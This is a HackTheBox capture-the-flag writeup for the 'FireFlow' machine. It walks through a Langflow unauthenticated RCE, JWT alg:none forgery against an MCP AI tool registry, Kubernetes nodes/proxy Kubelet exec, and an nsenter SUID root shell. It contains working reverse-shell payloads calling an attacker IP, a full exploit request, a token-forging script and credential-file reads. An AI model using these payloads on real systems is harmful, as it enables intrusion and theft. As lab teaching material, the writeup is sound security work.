# FireFlow — HackTheBox Writeup
**Difficulty:** Medium  
**OS:** Linux  
**Tags:** Langflow, CVE-2026-33017, JWT Algorithm Confusion, Kubernetes, nodes/proxy RCE

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Subdomain Enumeration](#subdomain-enumeration)
3. [Foothold — Langflow RCE (CVE-2026-33017)](#foothold--langflow-rce-cve-2026-33017)
4. [Lateral Movement — www-data → nightfall](#lateral-movement--www-data--nightfall)
5. [Privilege Escalation — JWT Algorithm Confusion](#privilege-escalation--jwt-algorithm-confusion)
6. [Kubernetes nodes/proxy Exploitation](#kubernetes-nodesproxy-exploitation)
7. [Root Flag](#root-flag)
8. [Bonus — SUID Shell as Root](#bonus--suid-shell-as-root)
9. [Step-by-Step Summary](#step-by-step-summary)

---

## Reconnaissance

Starting with a version and default script scan:

```bash
nmap -sV -sC 10.129.xx.xx
```

**Results:**

```
PORT      STATE    SERVICE   VERSION
22/tcp    open     ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
443/tcp   open     ssl/http  nginx
  |_http-title: Did not follow redirect to https://fireflow.htb/
  | ssl-cert: commonName=fireflow.htb / *.fireflow.htb
9100/tcp  filtered jetdirect
31337/tcp filtered Elite
```

Notable findings:
- Port **22** — SSH (OpenSSH 9.6p1)
- Port **443** — HTTPS nginx, redirecting to `fireflow.htb`
- SSL cert covers `fireflow.htb` and `*.fireflow.htb` — wildcard suggests subdomains

Add the target to `/etc/hosts`:

```
10.129.xx.xx   fireflow.htb
```

---

## Subdomain Enumeration

Using `ffuf` with virtual host fuzzing, filtering out the default redirect (301):

```bash
ffuf -u https://fireflow.htb/ -H "Host: FUZZ.fireflow.htb" \
  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fc 301
```

**Result:**

```
flow    [Status: 200, Size: 1142, Words: 132, Lines: 25, Duration: 239ms]
```

Add the discovered subdomain to `/etc/hosts`:

```
10.129.xx.xx   fireflow.htb flow.fireflow.htb
```

Navigating to `https://flow.fireflow.htb` reveals a **Langflow** instance. Confirm the version:

```bash
curl -k https://flow.fireflow.htb/api/v1/version
```

```json
{"version":"1.8.2","main_version":"1.8.2","package":"Langflow"}
```

**Langflow 1.8.2** — vulnerable to **CVE-2026-33017** (unauthenticated remote code execution via the public flow build endpoint).

---

## Foothold — Langflow RCE (CVE-2026-33017)

### Identifying the Flow ID

On `fireflow.htb`, clicking **Open Agent** redirects to:

```
https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25
```

The UUID `7d84d636-af65-42e4-ac38-26e867052c25` is the `flow_id`.

### Crafting the Exploit

CVE-2026-33017 abuses the `/api/v1/build_public_tmp/{flow_id}/flow` endpoint, which allows an unauthenticated user to submit an arbitrary custom component containing malicious Python code. The code executes server-side during the build process.

The payload uses a base64-encoded reverse shell to avoid special character issues:

```
bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1
```

Base64 encoded: `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC54eC54eC80NDQ0IDA+JjE=`

**Burp Suite POST Request:**

```http
POST /api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow HTTP/1.1
Host: flow.fireflow.htb
Content-Type: application/json

{
  "data": {
    "nodes": [
      {
        "id": "00000000-0000-0000-0000-000000000001",
        "type": "genericNode",
        "position": {"x": 0, "y": 0},
        "data": {
          "type": "CustomComponent",
          "id": "00000000-0000-0000-0000-000000000001",
          "node": {
            "template": {
              "_type": "CustomComponent",
              "code": {
                "value": "from langflow.custom import Component\nfrom langflow.io import Output\n_r = __import__('os').system(\"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC54eC54eC80NDQ0IDA+JjE= | base64 -d | bash\")\nclass ExploitComponent(Component):\n    display_name = \"ExploitComponent\"\n    outputs = [Output(display_name=\"Result\", name=\"output\", method=\"run\")]\n    def run(self) -> str: return \"ok\"",
                "type": "code",
                "required": true,
                "show": true,
                "name": "code",
                "dynamic": false,
                "list": false,
                "multiline": true
              }
            },
            "description": "poc",
            "display_name": "ExploitComponent",
            "custom_fields": {},
            "output_types": ["str"],
            "base_classes": ["str"],
            "outputs": [
              {
                "display_name": "Result",
                "name": "output",
                "method": "run",
                "selected": "str",
                "types": ["str"],
                "value": "__UNDEFINED__"
              }
            ]
          }
        }
      }
    ],
    "edges": [],
    "viewport": {"x": 0, "y": 0, "zoom": 1}
  }
}
```

### Catching the Shell

```bash
penelope -p 4444
```

```
[+] Got reverse shell from fireflow~10.129.xx.xx-Linux-x86_64
[+] Shell upgraded successfully using /usr/bin/python3!
```

```bash
www-data@fireflow:/var/lib/langflow$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Lateral Movement — www-data → nightfall

Dumping environment variables reveals credentials stored in the Langflow service environment:

```bash
www-data@fireflow:/var/lib/langflow$ env
```

```
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=<REDACTED>
LANGFLOW_SECRET_KEY=<REDACTED>
```

Check available home directories:

```bash
ls /home
nightfall
```

The superuser password reuses for the `nightfall` system account:

```bash
su - nightfall
Password: <REDACTED>
```

```bash
nightfall@fireflow:~$ cat user.txt
<REDACTED>
```

---

## Privilege Escalation — JWT Algorithm Confusion

### Discovering the Internal MCP Service

A config file in nightfall's home directory points to an internal service:

```bash
cat .mcp/config.json
```

```json
{
  "server": "http://10.129.xx.xx:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "<REDACTED>"
}
```

Querying the version endpoint reveals key information:

```bash
curl -s http://127.0.0.1:30080/api/v1/version | jq
```

```json
{
  "service": "MCP AI Tool Registry",
  "version": "0.1.0",
  "auth": {
    "type": "JWT",
    "supported_algorithms": ["HS256", "none"]
  },
  "endpoints": [
    "POST /mcp                  [MCP JSON-RPC 2.0]",
    "POST /api/v1/auth",
    "GET  /api/v1/tools",
    "POST /api/v1/tools         [admin]"
  ]
}
```

**Critical finding:** The service advertises support for the `none` algorithm — meaning JWT signatures can be stripped entirely and the server will still accept the token.

### Authenticating and Decoding the Token

```bash
curl -s -X POST http://127.0.0.1:30080/api/v1/auth \
  -H "Content-Type: application/json" \
  -d '{"username": "langflow-bot", "password": "<REDACTED>"}' | jq
```

Decoding the returned token confirms the payload:

```python
{'alg': 'HS256', 'typ': 'JWT'}
{'sub': 'langflow-bot', 'role': 'user'}
```

### Forging an Admin Token

Since the `none` algorithm is accepted, we craft a token with `role: admin` and no signature:

```python
# forge.py
import base64
import json

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "langflow-bot", "role": "admin"}

def b64url(obj):
    return base64.urlsafe_b64encode(
        json.dumps(obj, separators=(",", ":")).encode()
    ).decode().rstrip("=")

jwt = f"{b64url(header)}.{b64url(payload)}."
print(jwt)
```

```bash
python3 forge.py
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ.
```

Set the token:

```bash
TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ."
```

### Registering a Malicious Tool

With admin access, the `POST /api/v1/tools` endpoint allows registering arbitrary Python code as a new tool:

```bash
curl -s -X POST http://127.0.0.1:30080/api/v1/tools \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "rev",
    "description": "Reverse shell",
    "inputSchema": null,
    "code": "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.xx.xx\",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"
  }' | jq
```

```json
{"status": "registered", "name": "rev"}
```

### Triggering the Tool

```bash
curl -s -X POST http://127.0.0.1:30080/mcp \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {"name": "rev", "arguments": {}},
    "id": 1
  }'
```

```bash
penelope -p 4445
```

```
[+] Got reverse shell from mcp-server-54464cb475-29ztf~10.129.xx.xx-Linux-x86_64
```

We are now running as the `mcp` user inside a **Kubernetes pod**.

### Grabbing the Service Account Token

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# <REDACTED - Kubernetes SA JWT>
```

Export it for use:

```bash
TOKEN="<kubernetes-sa-token>"
```

> **Note:** The reverse shell connection via the MCP service is short-lived. Grab the Kubernetes service account token immediately.

---

## Kubernetes nodes/proxy Exploitation

### Checking Permissions

Back on the `nightfall` shell, check what the `mcp-sa` service account can do:

```bash
curl -k -s -H "Authorization: Bearer $TOKEN" \
  https://127.0.0.1:6444/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' | jq
```

Key permission:

```json
{
  "verbs": ["get"],
  "apiGroups": [""],
  "resources": ["nodes/proxy"]
}
```

The `nodes/proxy` GET permission allows proxying requests through the Kubelet API on port **10250**, including the `/exec` endpoint — which provides unauthenticated command execution inside any pod on the node.

### Listing Pods via nodes/proxy

```bash
curl -k -s -H "Authorization: Bearer $TOKEN" \
  https://127.0.0.1:6444/api/v1/nodes/fireflow/proxy/pods | jq
```

This lists all pods running on the node. The target pod is:

```
Namespace:  monitoring
Pod:        prometheus-prometheus-node-exporter-nmntq
Container:  node-exporter
```

The `prometheus-node-exporter` pod is particularly useful — it mounts `/` of the host filesystem at `/host/root` and runs as root.

### Downloading websocat

The Kubelet `/exec` endpoint uses WebSocket protocol, so `websocat` is needed to interact with it:

```bash
wget 10.10.xx.xx/websocat
chmod +x websocat
```

### Confirming RCE

```bash
./websocat --insecure \
  --header "Authorization: Bearer $TOKEN" \
  --protocol v4.channel.k8s.io \
  "wss://127.0.0.1:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?command=id&output=1&error=1"
```

```
uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)
```

We have code execution as **root** inside the node-exporter container, which has access to the host filesystem.

---

## Root Flag

List the host's root directory (accessible via the container's `/host/root` mount):

```bash
./websocat --insecure \
  --header "Authorization: Bearer $TOKEN" \
  --protocol v4.channel.k8s.io \
  "wss://127.0.0.1:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?command=ls&command=/host/root/root/&output=1&error=1"
```

```
root.txt  update_mcp_ip.sh
```

```bash
./websocat --insecure \
  --header "Authorization: Bearer $TOKEN" \
  --protocol v4.channel.k8s.io \
  "wss://127.0.0.1:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?command=cat&command=/host/root/root/root.txt&output=1&error=1"
```

```
<REDACTED>
```

---

## Bonus — SUID Shell as Root

To get a persistent interactive root shell on the host:

**Step 1:** Copy bash to `/tmp` as nightfall:

```bash
cp /bin/bash /tmp/bashroot
```

**Step 2:** Use node-exporter exec to chown it to root (using `nsenter` to break out of the container namespace):

```bash
./websocat --insecure \
  --header "Authorization: Bearer $TOKEN" \
  --protocol v4.channel.k8s.io \
  "wss://127.0.0.1:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?command=nsenter&command=--target&command=1&command=--mount&command=--&command=chown&command=root:root&command=/tmp/bashroot&output=1&error=1"
```

**Step 3:** Set the SUID bit:

```bash
./websocat --insecure \
  --header "Authorization: Bearer $TOKEN" \
  --protocol v4.channel.k8s.io \
  "wss://127.0.0.1:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?command=nsenter&command=--target&command=1&command=--mount&command=--&command=chmod&command=4755&command=/tmp/bashroot&output=1&error=1"
```

Verify:

```bash
ls -la /tmp/bashroot
# -rwsr-xr-x  1 root root 1446024 Jun 25 12:53 /tmp/bashroot
```

**Step 4:** Execute with privilege preservation:

```bash
/tmp/bashroot -p
```

```
bashroot-5.2# id
uid=1000(nightfall) gid=1000(nightfall) euid=0(root) groups=1000(nightfall)
```

Full interactive root shell on the host.

---

## Step-by-Step Summary

### Phase 1 — Reconnaissance
1. Run `nmap -sV -sC` against the target. Ports 22 (SSH) and 443 (HTTPS nginx) are open. The TLS certificate reveals the domain `fireflow.htb` and a wildcard `*.fireflow.htb`.
2. Add `fireflow.htb` to `/etc/hosts`.

### Phase 2 — Subdomain Discovery
3. Use `ffuf` with virtual host fuzzing to discover the subdomain `flow.fireflow.htb`.
4. Add it to `/etc/hosts` and visit it — it hosts a **Langflow 1.8.2** instance.

### Phase 3 — Initial Access (CVE-2026-33017)
5. On the main site `fireflow.htb`, click **Open Agent** to obtain the Langflow `flow_id` from the redirect URL.
6. Craft a POST request to `/api/v1/build_public_tmp/{flow_id}/flow` containing a malicious `CustomComponent` that base64-decodes and executes a reverse shell payload. This endpoint requires no authentication.
7. Start a listener (`penelope -p 4444`) and send the request. Receive a shell as `www-data`.

### Phase 4 — Credential Harvesting
8. Run `env` in the `www-data` shell. The Langflow service environment contains `LANGFLOW_SUPERUSER_PASSWORD` in plaintext.

### Phase 5 — User Flag
9. Use `su - nightfall` with the harvested password. The service password is reused for the `nightfall` system account.
10. Read `user.txt` from nightfall's home directory.

### Phase 6 — Internal Service Discovery
11. Read `.mcp/config.json` to find credentials for an internal MCP service running on port 30080.
12. Query `/api/v1/version` — the service accepts JWTs signed with the `none` algorithm.

### Phase 7 — JWT Algorithm Confusion → Admin Access
13. Authenticate with the `langflow-bot` credentials to receive a `role: user` JWT.
14. Forge a new JWT with `alg: none` and `role: admin` (no signature needed). The server accepts it.
15. Use the admin token to register a new tool via `POST /api/v1/tools` with arbitrary Python reverse shell code embedded in the `code` field.
16. Trigger the tool via `POST /mcp` (`tools/call`). Catch the shell as the `mcp` user inside a Kubernetes pod.

### Phase 8 — Kubernetes Service Account Token
17. Inside the pod, read the mounted service account token at `/var/run/secrets/kubernetes.io/serviceaccount/token`.

### Phase 9 — Kubernetes nodes/proxy Privilege Escalation
18. Back on the nightfall shell, use the SA token to query `SelfSubjectRulesReview` against the Kubernetes API. The token has `get` on `nodes/proxy`.
19. Use `nodes/proxy` to query `https://127.0.0.1:6444/api/v1/nodes/fireflow/proxy/pods` and enumerate all pods on the node. Identify the `prometheus-node-exporter` pod in the `monitoring` namespace — it runs as root and mounts the host filesystem at `/host/root`.
20. Download `websocat` to interact with the Kubelet WebSocket exec endpoint on port 10250.
21. Execute `id` via `wss://127.0.0.1:10250/exec/monitoring/{pod}/{container}?command=id&output=1&error=1` — confirms execution as root.
22. Read `/host/root/root/root.txt` via the same WebSocket exec endpoint.

### Phase 10 — Persistent Root Shell (Bonus)
23. Copy `/bin/bash` to `/tmp/bashroot` as `nightfall`.
24. Use the node-exporter exec endpoint with `nsenter --target 1 --mount` to run `chown root:root /tmp/bashroot` in the host namespace (breaking out of the container's mount namespace).
25. Set the SUID bit on `/tmp/bashroot` via the same method with `chmod 4755`.
26. Execute `/tmp/bashroot -p` on the host for a full interactive root shell.

---

*Writeup covers: Langflow CVE exploitation, environment variable credential leakage, JWT `alg:none` downgrade attack, MCP tool injection, Kubernetes `nodes/proxy` misuse, Kubelet WebSocket exec API, and container escape via `nsenter`.*
